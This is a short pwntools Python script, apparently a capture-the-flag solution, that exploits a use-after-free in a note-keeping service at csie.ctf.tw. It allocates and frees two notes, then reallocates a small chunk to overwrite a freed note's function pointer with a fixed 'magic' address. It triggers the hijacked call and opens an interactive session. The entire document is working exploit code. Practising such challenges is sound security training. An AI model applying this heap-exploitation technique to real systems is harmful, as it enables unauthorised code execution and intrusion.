from pwn import *
from time import sleep
context.arch = 'amd64'

r = remote('csie.ctf.tw',10137)
#r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23


def add_note(size,content):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(str(size))
    r.recvuntil(':')
    r.send(content)
def del_note(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.sendline(str(idx))
def print_note(idx):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.sendline(str(idx))

size = 64
content = 'faceb00c'
magic = 0x400c23

#first two
add_note(size,content)
add_note(size,content)
#
del_note(0)
del_note(1)
add_note(0x10,p64(magic))
print_note(0)
r.interactive()
